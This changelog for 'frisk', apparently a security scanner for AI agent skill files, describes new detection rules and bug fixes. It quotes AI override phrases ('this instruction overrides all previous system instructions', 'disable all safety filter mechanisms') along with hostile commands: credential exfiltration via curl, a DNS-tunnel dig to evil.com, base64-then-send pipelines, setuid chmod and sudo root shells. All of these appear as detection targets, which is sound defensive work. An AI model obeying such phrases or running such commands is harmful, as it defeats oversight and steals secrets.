# Changelog

## Unreleased (frisk/dig branch)

### New detection rules

**INJ-006 — Competing-priority override (injection / high / high)**
Catches skill prose that claims to override or supersede the system prompt or
operator instructions. Patterns: "this instruction overrides all previous system
instructions", "the following takes precedence over all other instructions",
"override/supersede all Anthropic/safety/operator guidelines". No legitimate
skill needs to claim priority over the system prompt.
- Positive fixture: `test/fixtures/malicious/priority-override/SKILL.md`
- Benign guard: "project style rules take precedence over personal editor
  preferences" — does not match because the object is not the system prompt.

**INJ-safety — Safety-filter disable (injection / high / high)**
Catches explicit instructions to disable safety filters, content guardrails, or
moderation mechanisms. Patterns: "disable all safety filter mechanisms", "bypass
content guardrail checks", "set safety_mode=off".
- Positive fixture: `test/fixtures/malicious/safety-disable/SKILL.md`
- Benign guard: "bypasses standard HTML escaping for template literals" — the
  object is HTML escaping, not a safety/content mechanism.

**MAL-007 — Chmod setuid/setgid on system path (malicious-code / high / high)**
Catches `chmod` calls that set the setuid (4xxx) or setgid (2xxx/6xxx) bit on
binaries under `/bin`, `/usr/bin`, `/usr/local/bin`, `/sbin`, `/usr/sbin`, or
`/etc`. Also catches `chmod u+s` / `chmod g+s` on those paths.
- Positive fixture: `test/fixtures/malicious/chmod-setuid/scripts/install.sh`
- Benign guard: `chmod 755 ./dist/my-tool` (no setuid, relative path).

**MAL-009 — Interactive root shell via sudo su / su root (malicious-code / high / high)**
Catches `sudo su -`, `sudo bash`, `sudo sh`, `sudo -i`, and `su - root` patterns
that drop into an interactive root shell.
- Benign guard: ordinary `sudo some-command` does not match.

**EXF-005 — Base64-encode-then-send (exfiltration / medium / medium)**
Catches `base64 | curl` or `base64 | wget` pipelines that encode data and
transmit it — a canonical exfiltration obfuscation technique. Emits medium/medium
standalone; when a secret read is also present in the same code unit the existing
EXF-004 taint-combo rule fires first (high/high).
- Positive fixture: `test/fixtures/malicious/base64-exfil/scripts/report.sh`

### Bug fixes

**exfiltration rule — false positive from commented-out credential references**
`src/rules/exfiltration.ts` was scanning `unit.source` raw. A commented-out line
like `# cat ~/.aws/credentials | curl ...` (a documentation example of what not
to do) fired as a high-severity finding. Fixed by applying `stripComments` before
testing SECRET_PATTERNS, EGRESS_PATTERNS, and SUSPICIOUS_HOSTS. `lineFor` now
receives the stripped text as the search source and `unit.source` as the original
so excerpts still show real code.

**capability rule — false positive from commented-out behavior**
`src/rules/capability.ts` was calling `anyMatch(unit.source, c.pats)` on raw
source. A comment like `# curl https://example.com` triggered an
undeclared-network finding. Fixed by applying `stripComments` before `anyMatch`.

**DNS exfil — interleaved flags evaded detection**
The old dig pattern `/\bdig\s+(?:@|\+short\b|[\w-]+\.[a-z])/` required the flag
or subdomain immediately after `dig`, so `dig +time=5 $data.evil.com` evaded it.
Replaced with two complementary patterns: one matching any dig invocation where a
shell variable appears before a domain (the canonical DNS-tunnel pattern), another
matching the explicit `@server` and `+short` flags.

### Expanded coverage

- **httpx** added to EGRESS_PATTERNS — the Python async HTTP client was absent,
  so `httpx.post(url, data=credentials)` only produced a medium exfiltration
  finding instead of the correct high/high combined finding.
- **SUSPICIOUS_HOSTS** expanded with `beeceptor.com` and
  `canarytokens.{com,org}`.

### SARIF enrichment

`src/report/sarif.ts` previously emitted rule entries with only `{ id }`. Added:
- `properties['security-severity']`: numeric 0–10 score (high=8.0, medium=5.5,
  low=2.0, info=0.0). GitHub code scanning requires this field to treat findings
  as security-relevant and gate PRs via branch protection rules. Without it,
  findings are informational only.
- `shortDescription.text`: human-readable summary shown in the Security tab.
- `helpUri`: links to the corpus pattern doc for each rule category.
- `properties.tags`: ASI0x taxonomy and category labels for filtering.
- `uriBaseId: '%SRCROOT%'` on every result location: required for GitHub to
  resolve relative file paths and show inline PR annotations on the correct line.
- `partialFingerprints.primaryLocationLineHash`: set to the frisk fingerprint so
  GitHub deduplicates findings across commits and does not re-flag already-
  dismissed results on subsequent pushes.
- Per-result `properties`: confidence, owasp, severity, remediation — allows
  downstream tooling to filter without re-parsing the message string.

### New corpus fixtures

| Fixture | Type | Category detected |
|---------|------|-------------------|
| `test/fixtures/malicious/priority-override` | malicious | injection |
| `test/fixtures/malicious/safety-disable` | malicious | injection |
| `test/fixtures/malicious/chmod-setuid` | malicious | malicious-code |
| `test/fixtures/malicious/base64-exfil` | malicious | exfiltration |
| `test/fixtures/benign/commented-creds` | benign (precision guard) | — |
| `test/fixtures/benign/ci-no-prompt` | benign (precision guard) | — |

Malicious recall: 27/27 (was 23/23). Benign precision gate: 9/9 (was 7/7, zero high FPs).

### Test counts

Before: 95 tests. After: 120 tests (+25). Typecheck: clean.

## 0.1.0 — 2026-06-19

Initial release.
